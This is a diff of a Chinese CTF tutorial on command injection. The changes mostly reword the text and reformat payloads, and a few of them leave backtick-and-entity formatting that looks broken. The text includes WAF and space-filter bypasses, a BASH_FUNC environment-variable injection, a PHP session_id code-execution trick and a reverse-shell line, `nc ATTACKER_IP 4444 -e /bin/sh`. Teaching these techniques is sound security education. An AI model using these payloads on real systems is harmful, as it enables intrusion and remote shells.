@@ -136,7 +136,7 @@ highlight_file(__FILE__);
 ?>
 ```
 
-`$ip` 完全可控，最终拼成了 `ping -c 1 <你的输入>` 丢给 shell 执行。于是：
+`$ip` 完全可控，最终交给 shell 执行的是 `ping -c 1 ` 拼接上你输入的内容，于是：
 
 | 请求 | 结果 |
 | --- | --- |
@@ -207,7 +207,15 @@ system("ping -c 1 " . $ip);
 ```
 
 !!! tip "一个高效的调试习惯"
-    把过滤规则"测"出来，而不是"猜"出来。例如空格被过滤时，依次发 `cat /flag`、`cat</flag`、`cat${IFS}/flag`，看哪一个不触发 WAF。这就是手工 fuzz，比问 AI 猜过滤规则快得多。
+    把过滤规则"测"出来，而不是"猜"出来。比如发现空格被过滤，就把同一个 payload 换成下面几种写法依次发，看哪一个不触发 WAF：
+
+    ```bash
+    cat /flag
+    cat</flag
+    cat${IFS}/flag
+    ```
+
+    这就是手工 fuzz，比问 AI 猜过滤规则快得多。
 
 ## 6. 有回显：先确认能不能看到输出 {: #has-echo }
 
@@ -369,7 +377,7 @@ nc ATTACKER_IP 4444 -e /bin/sh          # 目标有 nc -e 时（很多发行版�
 | `$IFS` | `cat${IFS}/flag` | 最稳，`$IFS` 默认就是空格/制表/换行 |
 | `$IFS$9` | `cat$IFS$9/flag` | `$9` 是空字符串，用于切断变量名 |
 | TAB | `cat%09/flag` | Web 场景下把空格换成 `%09` |
-| 重定向 | `cat</flag` | ⚠️ 重定向目标**不做通配符展开**，文件名必须确定 |
+| 重定向 | `cat`&lt;`/flag` | ⚠️ 重定向目标**不做通配符展开**，文件名必须确定 |
 | 花括号 | `{cat,/flag}` | **仅 bash 生效**，dash/ash 不行 |
 | 十六进制 | `cat$'\x20'/flag` | `$'...'` 是 bash/ksh 特性，ash 不支持 |
 
@@ -483,7 +491,7 @@ foreach($_REQUEST['envs'] as $key => $val) {
 system('echo hello');          // 注意：执行的是 bash 内置命令 echo
 ```
 
-既然变量名可控，就可以注入 `BASH_FUNC_<命令名>%%` 形式的环境变量，把要执行的那个内置命令**替换**成我们的代码：
+既然变量名可控，就可以注入 `BASH_FUNC_xxx%%` 形式的环境变量（`xxx` 换成 `system()` 里被调用的那个命令名，例如 `echo`），把要执行的内置命令**替换**成我们的代码：
 
 ```
 ?envs[BASH_FUNC_echo%%]=() { cat /flag; }
@@ -557,7 +565,7 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
     - `array_reverse()` 把数组倒过来，通常是为了少写几个 `next()`。
 
 !!! warning "`session_id()` 技巧为什么现在常常打不通"
-    `?code=show_source(session_id(session_start()));` + `Cookie: PHPSESSID=flag.php` 是老 writeup 的常客。它依赖"`session_start()` 原样保留 Cookie 里的 id"。在较新的 PHP 上，会话 id 校验/strict 模式会重新生成 id，**除非保存路径里已存在对应的 `sess_<id>` 文件**，此技巧就会失效。本文实测 PHP 8.4 下不生效。老 payload 打不通时，先怀疑这种版本差异，不要怀疑自己敲错了。
+    `?code=show_source(session_id(session_start()));` + `Cookie: PHPSESSID=flag.php` 是老 writeup 的常客。它依赖"`session_start()` 原样保留 Cookie 里的 id"。在较新的 PHP 上，会话 id 校验/strict 模式会重新生成 id，**除非保存路径里已存在对应的会话文件（`sess_` 前缀加会话 id）**，此技巧就会失效。本文实测 PHP 8.4 下不生效。老 payload 打不通时，先怀疑这种版本差异，不要怀疑自己敲错了。
 
 ### 9.3 突破 `disable_functions`（了解即可）
 
@@ -575,7 +583,7 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
 | 命令分隔符没生效 | 输入被 `escapeshellarg()` 转义、或被 WAF 拦 `;` `&` | 用 `%0a`；确认数据流向 |
 | `%0a` 变成了字面量 | URL 只解码一次，或你的工具二次编码 | 用 Burp 看**原始请求**，别用浏览器地址栏 |
 | `{cat,/flag}`、`$'\x20'` 不生效 | 这两个是 bash 专属语法，dash/ash（Debian 的 `/bin/sh`、alpine 的 ash）不支持 | 换 `$IFS`、`%09`；先确认目标 `/bin/sh` 指向什么 |
-| `cat</flag*` 报 No such file | **重定向目标不做通配符展开**（dash/ash/POSIX sh） | 文件名写全，或把通配符放在参数位 |
+| `cat`&lt;`/flag*` 报 No such file | **重定向目标不做通配符展开**（dash/ash/POSIX sh） | 文件名写全，或把通配符放在参数位 |
 | `||` 后面的命令不执行 | 前一条命令成功了 | 换 `;`，或让前一条故意失败 |
 | 命令执行了但页面没东西 | 无回显（`>/dev/null`、`exec` 只返回最后一行、缓冲区被清） | 见 [第 7 节](#no-echo) |
 | 带外收到的内容缺了 `{}` | `curl` 的 URL glob 把 `{}` 当范围展开 | 加 `-g`，或先 `base64` |
@@ -592,7 +600,7 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $code)){
 
 ## 11. AI 时代怎么学命令执行
 
-命令执行的知识点极度碎片化（`$IFS` 有几种写法、PHP 有几个版本、shell 有几个分支），这正是 AI 最擅长补位的场景；但也正是**最容易让人"以为自己学会了"**的场景。
+命令执行的知识点极度碎片化（`$IFS` 有几种写法、PHP 有几个版本、shell 有几个分支），这正是 AI 最擅长补位的场景；但也正是**最容易让人以为自己学会了**的场景。
 
 ### 11.1 把 AI 当成三种角色，而不是"答案机器"
 
